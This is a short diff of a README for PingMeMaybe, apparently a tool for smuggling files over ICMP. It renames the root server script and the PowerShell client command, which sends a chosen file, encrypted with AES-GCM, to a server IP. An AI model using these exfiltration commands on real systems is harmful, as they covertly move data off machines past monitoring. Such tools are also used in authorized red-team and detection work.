@@ -36,7 +36,7 @@ cd PingMeMaybe
 Run the Python server script with root privileges to listen for incoming ICMP packets:
 
 ```bash
-sudo python3 ping_smuggler_server.py
+sudo python3 server.py
 ```
 On startup, the server will generate and display a random AES-GCM key.
 Copy this key exactly as shown — you will need it on the client side.
@@ -46,7 +46,7 @@ Copy this key exactly as shown — you will need it on the client side.
 Run the PowerShell client script on a Windows machine with the following parameters:
 
 ```powershell
-.\Invoke-PingSmuggler.ps1 -Target <Server_IP> -File <Path_to_File> -HexKey <AES-GCM_Key>
+.\Invoke-PingMeMaybe.ps1 -Target <Server_IP> -File <Path_to_File> -HexKey <AES-GCM_Key>
 ```
 - **Target**: The IP address of the machine running the server.
 
